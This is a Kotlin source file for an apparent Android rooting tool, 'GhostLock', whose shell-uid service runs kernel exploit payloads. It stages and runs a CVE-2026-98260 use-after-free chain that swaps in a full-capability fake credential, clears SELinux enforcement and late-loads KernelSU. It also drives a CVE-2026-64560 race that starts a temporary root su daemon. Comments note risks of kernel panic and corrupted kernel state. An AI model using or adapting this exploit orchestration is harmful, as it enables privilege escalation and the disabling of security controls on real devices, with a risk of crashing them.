package top.honorhook.tools.ghostlock.shizuku

import android.content.Context
import android.os.Process
import android.system.Os
import android.system.OsConstants
import androidx.annotation.Keep
import top.honorhook.tools.ghostlock.data.ManagerScanner
import top.honorhook.tools.ghostlock.data.NativeProfileDocument
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.RandomAccessFile
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

@Keep
class GhostlockUserService(private val context: Context) : IGhostlockUserService.Stub() {
    private val running = AtomicBoolean(false)

    /* The 98260 payload is larger than a binder transaction, so the app
     * streams it here in chunks before runCve98260 consumes it. */
    private val payloadLock = Any()
    private val pendingPayload = ByteArrayOutputStream()

    private companion object {
        const val StatusMarker = "\u001eGLK_STATUS"
        const val StatusAck = "\u001eGLK_STATUS_ACK\n"
        const val StatusDisabled = "\u001eGLK_STATUS_DISABLED"

        /** One strategy's wall clock; the upstream runner uses 150 s. */
        const val STRATEGY_TIMEOUT_MS = 150_000L

        /** Non-zero, but distinct from a hard failure: no match, device intact. */
        const val EXIT_NO_MATCH = 2

        /** Fanout rounds per click; a clean miss leaves the kernel untouched. */
        const val FANOUT_ROUNDS = 3
        val ANSI_REGEX = Regex("\u001B\\[[0-9;]*[A-Za-z]")
        val PROTECTED_MARKERS = listOf(
            "MISC_BRIDGE_MISS_PRESERVE",
            "KERNEL_STATE_PRESERVE",
            "CRED_STATE_PRESERVE",
            "KERNEL_STATE_RESTORE_NOT_PROVEN",
            "KERNEL_STATE_CORRUPTED",
        )
    }

    override fun runExploit(
        primaryCpu: Int,
        consumerCpu: Int,
        safeMode: Boolean,
        forceAttack: Boolean,
        profileBlob: ByteArray,
        debugDir: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ) = runExploitAsManager(primaryCpu, consumerCpu, safeMode, forceAttack, profileBlob, debugDir, null, callback, statusCallback)

    override fun runExploitAsManager(
        primaryCpu: Int,
        consumerCpu: Int,
        safeMode: Boolean,
        forceAttack: Boolean,
        profileBlob: ByteArray,
        debugDir: String?,
        managerPackage: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ) {
        if (!running.compareAndSet(false, true)) {
            callback.onLog("<s> error: another GhostLock process is already running")
            callback.onComplete(1)
            return
        }
        Thread({
            val exitCode = runCatching {
                require(Process.myUid() == Process.SHELL_UID) {
                    "Shizuku UserService uid=${Process.myUid()}, expected ${Process.SHELL_UID}"
                }
                val status = File("/proc/self/status").readText()
                require(Regex("(?m)^Seccomp:\\s*0$").containsMatchIn(status)) {
                    "Shizuku UserService is still seccomp-filtered"
                }
                val release = System.getProperty("os.version", "").orEmpty()
                require(profileBlob.size >= 16) { "profile blob is too short" }
                // PROFILE-SUGGEST-01: recommend_shizuku is a suggestion; the
                // blob's meta section carries it, and the app already chose the
                // Shizuku path, so it is logged, never a gate.
                if (NativeProfileDocument.fromBinary(profileBlob)?.recommendShizuku != 1u) {
                    callback.onLog("<s> kernel does not require Shizuku; running on user request")
                }

                val binary = File(context.applicationInfo.nativeLibraryDir, "libghostlock.so")
                require(binary.isFile) { "missing GhostLock binary: ${binary.absolutePath}" }

                val workDir = File("/data/local/tmp/ghostlock-app").apply {
                    require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
                }
                callback.onLog("<s> Shizuku ready: uid=${Process.myUid()} Seccomp=0")
                callback.onLog("<s> kernel: $release")
                // Same resolution as the direct path: chosen manager first,
                // then the built-ins. Native gets the path via GHOSTLOCK_KSUD.
                val pm = context.packageManager
                val staging = File(workDir, "ksud")
                callback.onLog("<s> manager choice: ${managerPackage ?: "auto"}")
                val resolved = ManagerScanner.resolveKsud(pm, managerPackage, staging)
                val ksudPath = resolved?.file
                val managerPkg = resolved?.packageName
                resolved?.let {
                    callback.onLog("<s> ksud resolved: ${it.file.absolutePath} (manager=${it.packageName})")
                }
                if (managerPackage != null && resolved != null && resolved.packageName != managerPackage) {
                    callback.onLog(
                        "<s> $managerPackage has no usable libksud.so; falling back to ${resolved.packageName}",
                    )
                }
                val nativeLog = File(workDir, ".ghostlock_native.log")
                // U01-S14: per-run KernelSU log so a previous run's markers can
                // never satisfy the handoff probe; the native process receives
                // the resolved path via GHOSTLOCK_KSU_LOG.
                val ksuLog = File(workDir, "ghostlock-ksu-${System.currentTimeMillis()}.log")
                // v2: safe_mode lives in the meta section; there is no fixed
                // slot offset, so the blob is rescanned and rewritten.
                val effectiveBlob = if (safeMode) {
                    NativeProfileDocument.patchSafeMode(profileBlob) ?: profileBlob
                } else {
                    profileBlob
                }
                val argv = mutableListOf(
                    binary.absolutePath,
                    "--ghostlock-app-call",
                    "--enable-status-record",
                )
                if (forceAttack) {
                    argv += "--force-attack"
                }
                if (!debugDir.isNullOrEmpty()) {
                    argv += listOf("--dump-kernel-log", debugDir)
                }
                callback.onLog("<b> starting native: ${binary.absolutePath}")
                ProcessBuilder(argv)
                    .directory(workDir)
                    .redirectErrorStream(true)
                    .redirectOutput(nativeLog)
                    .apply {
                        environment()["GHOSTLOCK_HOME"] = workDir.absolutePath
                        environment()["TMPDIR"] = workDir.absolutePath
                        environment()["HOME"] = workDir.absolutePath
                        environment()["GHOSTLOCK_KSU_LOG"] = ksuLog.absolutePath
                        if (ksudPath != null && managerPkg != null) {
                            environment()["GHOSTLOCK_KSUD"] = ksudPath.absolutePath
                            environment()["GHOSTLOCK_KSU_PKG"] = managerPkg
                        }
                    }
                    .start()
                    .let { process ->
                        val stdinOut = process.outputStream
                        /* Length-prefixed GLK1; stdin stays open for the ACK. */
                        runCatching {
                            val length = effectiveBlob.size
                            stdinOut.write(
                                byteArrayOf(
                                    (length ushr 24).toByte(),
                                    (length ushr 16).toByte(),
                                    (length ushr 8).toByte(),
                                    length.toByte(),
                                ),
                            )
                            stdinOut.write(effectiveBlob)
                            stdinOut.flush()
                        }
                        // The native process writes its log to a file and this
                        // tailer forwards lines asynchronously. Reading a pipe
                        // here applied backpressure inside the PI race window
                        // (every line also costs a binder round trip), which
                        // stalled the route and ended in a kernel panic.
                        val tailer = Thread({
                            relayLog(nativeLog, callback, statusCallback, stdinOut)
                        }, "ghostlock-shizuku-tailer").apply {
                            isDaemon = true
                            start()
                        }
                        val exitCode = process.waitFor()
                        callback.onLog("<b> native exited code=$exitCode")
                        Thread.sleep(200)
                        tailer.interrupt()
                        tailer.join(1000)
                        exitCode
                    }
            }.getOrElse { error ->
                runCatching { callback.onLog("<s> error: ${error.message}") }
                1
            }
            running.set(false)
            runCatching { callback.onComplete(exitCode) }
        }, "ghostlock-shizuku-runner").start()
    }

    /** Forward complete native log lines without ever blocking the native
     * process; the file is the transport, binder is only the display path. */
    /** Forwards status events to the app (persist) and ACKs the native process;
     *  returns true when the line was a status event. */
    private fun handleStatusLine(
        line: String,
        statusCallback: IGhostlockStatusCallback,
        stdinOut: java.io.OutputStream,
    ): Boolean {
        if (!line.startsWith(StatusMarker)) return false
        if (line.contains(StatusDisabled)) {
            runCatching { statusCallback.onStatus("", "disabled") }
            return true
        }
        val parts = line.removePrefix(StatusMarker).trim().split(' ')
        if (parts.size >= 2) {
            runCatching { statusCallback.onStatus(parts[0], parts[1]) }
            runCatching {
                stdinOut.write(StatusAck.toByteArray(Charsets.UTF_8))
                stdinOut.flush()
            }
        }
        return true
    }

    private fun relayLog(
        logFile: File,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
        stdinOut: java.io.OutputStream,
    ) {
        var offset = 0L
        val pending = StringBuilder()
        while (!Thread.currentThread().isInterrupted) {
            try {
                if (logFile.isFile) {
                    RandomAccessFile(logFile, "r").use { handle ->
                        if (offset > handle.length()) {
                            offset = 0
                            pending.clear()
                        }
                        handle.seek(offset)
                        while (true) {
                            val byte = handle.read()
                            if (byte == -1) break
                            if (byte == '\n'.code) {
                                val line = pending.toString()
                                pending.clear()
                                offset = handle.filePointer
                                if (line.isNotEmpty()) {
                                    if (!handleStatusLine(line, statusCallback, stdinOut)) {
                                        runCatching { callback.onLog(line) }
                                    }
                                }
                            } else {
                                pending.append(byte.toChar())
                            }
                        }
                    }
                }
                Thread.sleep(100)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return
            } catch (_: Exception) {
                try {
                    Thread.sleep(200)
                } catch (_: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return
                }
            }
        }
    }

    /**
     * CVE-2026-98260 Android port. The payload runs as the shell uid and, on
     * success, promotes a fake root cred and starts the 64560 temporary-su
     * daemon. The service only polls the daemon; it does not touch the UAF
     * process after it starts.
     */
    override fun beginCve98260() {
        synchronized(payloadLock) { pendingPayload.reset() }
    }

    override fun appendCve98260(chunk: ByteArray) {
        synchronized(payloadLock) { pendingPayload.write(chunk) }
    }

    override fun runCve98260(
        su: ByteArray,
        debugDir: String?,
        managerPackage: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ) {
        val payload = synchronized(payloadLock) {
            val bytes = pendingPayload.toByteArray()
            pendingPayload.reset()
            bytes
        }
        if (payload.isEmpty()) {
            callback.onLog("<s> error: empty CVE-2026-98260 payload")
            callback.onComplete(1)
            return
        }
        if (!running.compareAndSet(false, true)) {
            callback.onLog("<s> error: another GhostLock process is already running")
            callback.onComplete(1)
            return
        }
        Thread({
            val exitCode = runCatching {
                runCve98260Blocking(payload, su, debugDir, managerPackage, callback, statusCallback)
            }.getOrElse { error ->
                runCatching { callback.onLog("<s> error: ${error.message}") }
                1
            }
            running.set(false)
            runCatching { callback.onComplete(exitCode) }
        }, "ghostlock-cve98260-runner").start()
    }

    private fun runCve98260Blocking(
        payload: ByteArray,
        su: ByteArray,
        debugDir: String?,
        managerPackage: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ): Int {
        require(Process.myUid() == Process.SHELL_UID) {
            "Shizuku UserService uid=${Process.myUid()}, expected ${Process.SHELL_UID}"
        }
        val procStatus = File("/proc/self/status").readText()
        require(Regex("(?m)^Seccomp:\\s*0$").containsMatchIn(procStatus)) {
            "Shizuku UserService is still seccomp-filtered"
        }
        callback.onLog("<s> CVE-2026-98260 Android port: uid=${Process.myUid()} Seccomp=0")
        val workDir = File("/data/local/tmp/ghostlock-app/cve98260").apply {
            require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
        }
        val suDir = File("/data/local/tmp/ghostlock-app/cve64560").apply {
            require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
        }
        val suFile = writePayload(suDir, "cve-64560-su", su)
        val payloadFile = writePayload(workDir, "cve-2026-98260-uid0", payload)
        callback.onLog("<s> payload: ${payloadFile.absolutePath} (${payload.size}B)")
        if (!debugDir.isNullOrEmpty()) callback.onLog("<s> debug dir: $debugDir")

        /* The 98260 payload hands root to whichever manager we name, so resolve
         * the user's choice here; without it the payload self-discovers and
         * always prefers KernelSU. */
        val pm = context.packageManager
        val staging = File("/data/local/tmp/ghostlock-app/ksud")
        callback.onLog("<s> manager choice: ${managerPackage ?: "auto"}")
        val resolved = ManagerScanner.resolveKsud(pm, managerPackage, staging)
        if (resolved != null) {
            callback.onLog("<s> ksud resolved: ${resolved.file.absolutePath} (manager=${resolved.packageName})")
        } else {
            callback.onLog("<s> no manager with libksud.so; payload will self-discover")
        }
        if (managerPackage != null && resolved?.packageName != managerPackage) {
            callback.onLog("<s> $managerPackage has no usable libksud.so; falling back to ${resolved?.packageName ?: "self-discover"}")
            /* Diagnostic: dump what .so files actually live inside the chosen
             * manager APK so we know whether it renamed ksud or uses a
             * completely different package. */
            ManagerScanner.listApkLibraries(pm, managerPackage)?.let { libs ->
                val interesting = libs.filter { "ksud" in it || "kernelsu" in it || "su" in it }
                if (interesting.isEmpty()) {
                    callback.onLog("<s> $managerPackage libs: ${libs.joinToString()}")
                } else {
                    callback.onLog("<s> $managerPackage ksud/su libs: ${interesting.joinToString()}")
                }
            } ?: callback.onLog("<s> $managerPackage: APK not readable")
        }

        if (isKernelSuLive()) {
            callback.onLog("<s> KernelSU is already live from this boot")
            completeAllSteps(statusCallback)
            logKernelSuIdentity(callback)
            return 0
        }

        val logFile = File(workDir, "cve-2026-98260.log")
        runCatching { logFile.delete() }
        statusCallback.onStatus("c1", "in_progress")
        callback.onLog("<b> starting CVE-2026-98260 UAF process (fake cred -> ksud late-load)")
        // "fake" is YuKongA's chain: swing task->cred at a full-cap fake cred,
        // clear selinux_state.enforcing, then exec ksud late-load for this KMI.
        val process = ProcessBuilder(payloadFile.absolutePath, "fake")
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.to(logFile))
            .apply {
                if (resolved != null) {
                    environment()["GHOSTLOCK_KSUD"] = resolved.file.absolutePath
                    environment()["GHOSTLOCK_KSU_PKG"] = resolved.packageName
                }
            }
            .start()
        val reader = Thread({
            tailSimpleLog(logFile, process, callback)
        }, "ghostlock-cve98260-log").apply {
            isDaemon = true
            start()
        }
        val deadline = System.currentTimeMillis() + 900_000L
        var rooted = false
        while (System.currentTimeMillis() < deadline) {
            if (isKernelSuLive()) {
                rooted = true
                break
            }
            Thread.sleep(1_000)
        }
        if (!rooted && isKernelSuLive()) rooted = true
        if (rooted) {
            completeAllSteps(statusCallback)
            callback.onLog("<b> ROOT_SUCCESS backend=cve_2026_98260+kernelsu")
            logKernelSuIdentity(callback)
            runCatching { reader.interrupt() }
            return 0
        }
        runCatching { reader.interrupt() }
        runCatching { reader.join(1_000) }
        markStopped(statusCallback)
        callback.onLog("<s> CVE-2026-98260: KernelSU did not come up; device was not rebooted")
        return EXIT_NO_MATCH
    }

    /** True once the late-loaded KernelSU module is listed by the kernel. */
    private fun isKernelSuLive(): Boolean = runCatching {
        File("/proc/modules").readLines().any { it.startsWith("kernelsu ") }
    }.getOrDefault(false)

    /** Report the real KernelSU context so success is not a proxy signal. */
    private fun logKernelSuIdentity(callback: IGhostlockCallback) {
        /* KernelSU does not always expose su on PATH, so probe the known
         * install locations as well as the plain command. */
        val probes = listOf(
            listOf("su", "-c", "id"),
            listOf("/data/adb/ksu/bin/su", "-c", "id"),
            listOf("/system/bin/su", "-c", "id"),
        )
        val out = probes.firstNotNullOfOrNull(::runProbe)
        callback.onLog("<s> ksu identity: ${out ?: "(su unavailable)"}")
    }

    private fun runProbe(command: List<String>): String? = runCatching {
        val process = ProcessBuilder(command).redirectErrorStream(true).start()
        if (!process.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)) {
            process.destroyForcibly()
            return@runCatching null
        }
        process.inputStream.bufferedReader().readText().trim().takeIf { it.isNotEmpty() }
    }.getOrNull()

    private inner class SimpleLogPump(
        private val logFile: File,
        private val callback: IGhostlockCallback,
    ) {
        private var readOffset = 0L
        private val pending = StringBuilder()

        fun pump() {
            if (!logFile.isFile) return
            RandomAccessFile(logFile, "r").use { handle ->
                if (readOffset > handle.length()) {
                    readOffset = 0
                    pending.clear()
                }
                handle.seek(readOffset)
                while (true) {
                    val byte = handle.read()
                    if (byte == -1) break
                    if (byte == '\n'.code) {
                        emit(pending.toString())
                        pending.clear()
                    } else {
                        pending.append(byte.toChar())
                    }
                }
                readOffset = handle.filePointer
            }
        }

        fun finish() {
            runCatching { pump() }
            if (pending.isNotEmpty()) emit(pending.toString())
        }

        private fun emit(value: String) {
            val line = stripAnsi(value)
            if (line.isNotBlank()) runCatching { callback.onLog(line) }
        }
    }

    private fun tailSimpleLog(
        logFile: File,
        process: java.lang.Process,
        callback: IGhostlockCallback,
    ) {
        val pump = SimpleLogPump(logFile, callback)
        while (!Thread.currentThread().isInterrupted) {
            runCatching { pump.pump() }
            if (!process.isAlive) break
            Thread.sleep(200)
        }
        pump.finish()
    }

    /**
     * CVE-2026-64560 backend. The shell-uid service writes the three payloads
     * to /data/local/tmp, runs the fanout and rotate strategies, and waits for
     * the current-boot temporary-su daemon. No profile and no kernel-version
     * gate is involved: the payload itself decides whether the race can land.
     */
    override fun runCve64560(
        fanout: ByteArray,
        rotate: ByteArray,
        su: ByteArray,
        debugDir: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ) {
        if (!running.compareAndSet(false, true)) {
            callback.onLog("<s> error: another GhostLock process is already running")
            callback.onComplete(1)
            return
        }
        Thread({
            val exitCode = runCatching {
                runCve64560Blocking(fanout, rotate, su, debugDir, callback, statusCallback)
            }.getOrElse { error ->
                runCatching { callback.onLog("<s> error: ${error.message}") }
                1
            }
            running.set(false)
            runCatching { callback.onComplete(exitCode) }
        }, "ghostlock-cve64560-runner").start()
    }

    private fun runCve64560Blocking(
        fanout: ByteArray,
        rotate: ByteArray,
        su: ByteArray,
        debugDir: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ): Int {
        require(Process.myUid() == Process.SHELL_UID) {
            "Shizuku UserService uid=${Process.myUid()}, expected ${Process.SHELL_UID}"
        }
        val procStatus = File("/proc/self/status").readText()
        require(Regex("(?m)^Seccomp:\\s*0$").containsMatchIn(procStatus)) {
            "Shizuku UserService is still seccomp-filtered"
        }
        callback.onLog("<s> CVE-2026-64560 backend: uid=${Process.myUid()} Seccomp=0 (gate-free)")
        val workDir = File("/data/local/tmp/ghostlock-app/cve64560").apply {
            require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
        }
        /* A preserved payload is deliberately left in the kernel (SIGSTOP)
         * instead of being torn down, so a second attempt must not run on top
         * of it. The marker is cleared automatically after a reboot. */
        val preservedMarker = File(workDir, "preserved.pid")
        if (preservedMarker.isFile) {
            val heldPid = preservedMarker.readText().trim().toIntOrNull()
            if (heldPid != null && File("/proc/$heldPid").exists()) {
                callback.onLog("<s> a preserved payload is still held (pid=$heldPid); reboot manually before another attempt")
                markStopped(statusCallback)
                return EXIT_NO_MATCH
            }
            runCatching { preservedMarker.delete() }
        }
        waitForThermal(callback)
        val fanoutFile = writePayload(workDir, "cve-64560-fanout", fanout)
        val rotateFile = writePayload(workDir, "cve-64560-rotate", rotate)
        val suFile = writePayload(workDir, "cve-64560-su", su)
        callback.onLog("<k> rotate payload installed but not auto-run: ${rotateFile.name}")
        callback.onLog("<s> payload dir: ${workDir.absolutePath}")
        if (!debugDir.isNullOrEmpty()) callback.onLog("<s> debug dir: $debugDir")

        /* A daemon from an earlier run in this boot is already the objective. */
        if (checkTemporarySu(suFile)) {
            callback.onLog("<s> temporary-su daemon is already running from this boot")
            completeAllSteps(statusCallback)
            logRootIdentity(suFile, callback)
            return 0
        }

        /* Rotate is intentionally not run automatically on this target: the
         * rotate payload panics in Stage 0 on the OS4.0.0.22 build and reboots
         * the device. Fanout is stable (clean miss / preserved state), so the
         * app only runs fanout. The rotate asset stays packaged for manual or
         * future per-build use.
         *
         * A clean miss leaves the kernel untouched, so retry fanout a few times
         * in the same boot. A preserve freezes the payload instead. */
        callback.onLog("<s> rotate strategy disabled on this build (it panics); fanout only")
        val rounds = FANOUT_ROUNDS
        for (round in 1..rounds) {
            callback.onLog("<b> CVE-2026-64560 fanout round $round/$rounds")
            statusCallback.onStatus("c1", "in_progress")
            runPreflight(fanoutFile, callback)
            val outcome = runStrategy(fanoutFile, suFile, callback, statusCallback)
            if (outcome.rooted) {
                runCatching { File(workDir, "preserved.pid").delete() }
                completeAllSteps(statusCallback)
                callback.onLog("<b> ROOT_SUCCESS strategy=fanout round=$round")
                callback.onLog("<s> root shell: $suFile --client (or: adb shell ${suFile.absolutePath} --client)")
                logRootIdentity(suFile, callback)
                return 0
            }
            if (outcome.protectedState) {
                /* The payload declared a preserved/corrupted kernel state. It
                 * has been SIGSTOPped and preserved.pid written; do not run
                 * another round in the same boot. The device stays up. */
                callback.onLog("<s> fanout: no match; kernel state preserved, stopping without reboot")
                markStopped(statusCallback)
                return EXIT_NO_MATCH
            }
            callback.onLog("<s> fanout: clean miss (round $round/$rounds); device not rebooted")
        }
        callback.onLog("<s> CVE-2026-64560: no root after $rounds rounds; device was not rebooted")
        markStopped(statusCallback)
        return EXIT_NO_MATCH
    }

    private fun markStopped(statusCallback: IGhostlockStatusCallback) {
        for (step in listOf("c1", "c2", "c3")) {
            runCatching { statusCallback.onStatus(step, "stopped") }
        }
    }

    private data class StrategyOutcome(
        val rooted: Boolean,
        val protectedState: Boolean,
        val timedOut: Boolean,
    )

    private fun runStrategy(
        binary: File,
        suFile: File,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ): StrategyOutcome {
        /* The payload writes to a file, not a pipe: a slow binder callback must
         * never apply backpressure to the race (same rule as the native path). */
        val logFile = File(binary.parentFile, "${binary.name}.log")
        runCatching { logFile.delete() }
        val process = ProcessBuilder(binary.absolutePath, "--run")
            .directory(binary.parentFile)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.to(logFile))
            .start()
        val protectedState = AtomicBoolean(false)
        val tailer = StrategyLogTailer(logFile, protectedState, callback, statusCallback)
        val reader = Thread({
            while (!Thread.currentThread().isInterrupted) {
                runCatching { tailer.pump() }
                if (!process.isAlive) break
                Thread.sleep(100)
            }
            tailer.finish()
        }, "ghostlock-cve64560-log").apply {
            isDaemon = true
            start()
        }
        // The root child inherits this stdin and executes both commands once
        // the credential stage lands.
        runCatching {
            process.outputStream.write("${suFile.absolutePath} --daemon\nexit\n".toByteArray())
            process.outputStream.flush()
        }
        val deadline = System.currentTimeMillis() + STRATEGY_TIMEOUT_MS
        var rooted = false
        var preserved = false
        while (System.currentTimeMillis() < deadline) {
            if (checkTemporarySu(suFile)) {
                rooted = true
                break
            }
            if (!process.isAlive) break
            if (protectedState.get()) {
                /* Do NOT destroy the payload here: it is spinning in
                 * hold_cred_unknown() with a possibly corrupted kernel state.
                 * Tearing it down can panic the kernel. Freeze it instead and
                 * report a plain miss; the device stays up. */
                preserved = true
                break
            }
            Thread.sleep(1_000)
        }
        if (!rooted && checkTemporarySu(suFile)) rooted = true
        /* A timeout is handled like a preserve: never tear down a process that
         * may still hold corrupted kernel state. */
        val timedOut = !rooted && System.currentTimeMillis() >= deadline
        if (!rooted && (preserved || timedOut)) {
            preserved = true
            val pid = process.pid()
            val frozen = runCatching { Os.kill(pid.toInt(), OsConstants.SIGSTOP) }.isSuccess
            callback.onLog(
                "<s> ${binary.name}: kernel state preserved; payload pid=$pid " +
                    (if (frozen) "frozen with SIGSTOP" else "left running") +
                    "; device not rebooted",
            )
            runCatching { File(binary.parentFile, "preserved.pid").writeText("$pid ${binary.name}") }
            reader.interrupt()
            runCatching { reader.join(1_000) }
            return StrategyOutcome(false, true, timedOut)
        }
        if (rooted) {
            process.waitFor(15, TimeUnit.SECONDS)
        }
        reader.join(3_000)
        if (process.isAlive) process.destroyForcibly()
        return StrategyOutcome(rooted, false, false)
    }

    private inner class StrategyLogTailer(
        private val logFile: File,
        private val protectedState: AtomicBoolean,
        private val callback: IGhostlockCallback,
        private val statusCallback: IGhostlockStatusCallback,
    ) {
        private var readOffset = 0L
        private val pending = StringBuilder()

        fun pump() {
            if (!logFile.isFile) return
            RandomAccessFile(logFile, "r").use { handle ->
                if (readOffset > handle.length()) {
                    readOffset = 0
                    pending.clear()
                }
                handle.seek(readOffset)
                while (true) {
                    val byte = handle.read()
                    if (byte == -1) break
                    if (byte == '\n'.code) {
                        emit(pending.toString())
                        pending.clear()
                    } else {
                        pending.append(byte.toChar())
                    }
                }
                /* Partial lines stay buffered; the next pump reads only the
                 * bytes appended after this point. */
                readOffset = handle.filePointer
            }
        }

        fun finish() {
            runCatching { pump() }
            if (pending.isNotEmpty()) emit(pending.toString())
        }

        private fun emit(line: String) {
            val text = stripAnsi(line)
            if (text.isBlank()) return
            if (PROTECTED_MARKERS.any(text::contains)) protectedState.set(true)
            advanceStep(text, statusCallback)
            runCatching { callback.onLog(text) }
        }
    }

    private fun runPreflight(binary: File, callback: IGhostlockCallback) {
        runCatching {
            val process = ProcessBuilder(binary.absolutePath, "--preflight")
                .directory(binary.parentFile)
                .redirectErrorStream(true)
                .start()
            val output = process.inputStream.bufferedReader().readText()
            process.waitFor(120, TimeUnit.SECONDS)
            if (process.isAlive) process.destroyForcibly()
            output.lineSequence().filter { it.isNotBlank() }.forEach {
                callback.onLog(stripAnsi(it))
            }
        }.onFailure { callback.onLog("<s> warning: preflight failed: ${it.message}") }
    }

    /** Match the upstream runner: do not start the race on a hot CPU. */
    private fun waitForThermal(callback: IGhostlockCallback) {
        val limitMilliC = 55_000
        val deadline = System.currentTimeMillis() + 10 * 60 * 1_000L
        var lastLog = 0L
        while (System.currentTimeMillis() < deadline) {
            val max = cpuThermalMilliC()
            if (max == null) {
                callback.onLog("<s> thermal zones unavailable; starting without a thermal gate")
                return
            }
            if (max <= limitMilliC) {
                callback.onLog("<s> thermal ok: max_cpu=${max / 1000.0}C")
                return
            }
            val now = System.currentTimeMillis()
            if (now - lastLog > 10_000L) {
                callback.onLog("<s> thermal ${max / 1000.0}C > ${limitMilliC / 1000.0}C; waiting for CPU to cool")
                lastLog = now
            }
            Thread.sleep(5_000)
        }
        callback.onLog("<s> thermal wait expired; starting anyway")
    }

    private fun cpuThermalMilliC(): Int? {
        val zones = File("/sys/class/thermal").listFiles { file ->
            file.name.startsWith("thermal_zone")
        } ?: return null
        var maximum = -1
        for (zone in zones) {
            val type = File(zone, "type").takeIf { it.isFile }
                ?.readText()?.trim().orEmpty()
            if (type != "cpu_therm" && !type.startsWith("cpu-") && !type.startsWith("cpuss-")) continue
            val value = File(zone, "temp").takeIf { it.isFile }
                ?.readText()?.trim()?.toIntOrNull() ?: continue
            if (value > maximum) maximum = value
        }
        return maximum.takeIf { it >= 0 }
    }

    private fun writePayload(workDir: File, name: String, bytes: ByteArray): File {
        val temporary = File(workDir, "$name.tmp")
        val target = File(workDir, name)
        temporary.writeBytes(bytes)
        if (target.exists() && !target.delete()) {
            throw IllegalStateException("cannot replace ${target.absolutePath}")
        }
        require(temporary.renameTo(target)) { "cannot install ${target.absolutePath}" }
        require(
            target.setReadable(true, false) &&
                target.setExecutable(true, false) &&
                target.setWritable(false, false),
        ) { "cannot chmod ${target.absolutePath}" }
        return target
    }

    private fun checkTemporarySu(suFile: File): Boolean = runCatching {
        val process = ProcessBuilder(suFile.absolutePath, "--check")
            .redirectErrorStream(true)
            .start()
        val output = process.inputStream.bufferedReader().readText()
        process.waitFor(5, TimeUnit.SECONDS)
        if (process.isAlive) process.destroyForcibly()
        process.exitValue() == 0 && output.contains("TEMP_SU_DAEMON_READY")
    }.getOrDefault(false)

    private fun logRootIdentity(suFile: File, callback: IGhostlockCallback) {
        runCatching {
            val process = ProcessBuilder(suFile.absolutePath, "--client")
                .redirectErrorStream(true)
                .start()
            process.outputStream.write("id\nexit\n".toByteArray())
            process.outputStream.close()
            val output = process.inputStream.bufferedReader().readText()
            process.waitFor(5, TimeUnit.SECONDS)
            if (process.isAlive) process.destroyForcibly()
            val identity = output.lineSequence().lastOrNull { it.contains("uid=") }
                ?: output.trim()
            callback.onLog("<s> root identity: $identity")
        }.onFailure { callback.onLog("<s> warning: root identity check failed: ${it.message}") }
    }

    private fun advanceStep(line: String, statusCallback: IGhostlockStatusCallback) {
        when {
            line.contains("STAGE0_GATE_PASS") || line.contains("BOOTID_WRITE_PASS") -> {
                statusCallback.onStatus("c1", "completed")
                statusCallback.onStatus("c2", "in_progress")
            }

            line.contains("MISC_BRIDGE_READ_PASS") -> {
                statusCallback.onStatus("c1", "completed")
                statusCallback.onStatus("c2", "in_progress")
            }

            line.contains("ROOT_CHILD_HOLD_PASS") -> {
                statusCallback.onStatus("c2", "completed")
                statusCallback.onStatus("c3", "in_progress")
            }

            line.contains("TEMP_SU_DAEMON_STARTED") -> {
                statusCallback.onStatus("c3", "completed")
            }
        }
    }

    private fun completeAllSteps(statusCallback: IGhostlockStatusCallback) {
        for (step in listOf("c1", "c2", "c3")) {
            runCatching { statusCallback.onStatus(step, "completed") }
        }
    }

    private fun stripAnsi(value: String): String = value.replace(ANSI_REGEX, "")

    override fun destroy() {
        if (!running.get()) kotlin.system.exitProcess(0)
    }
}
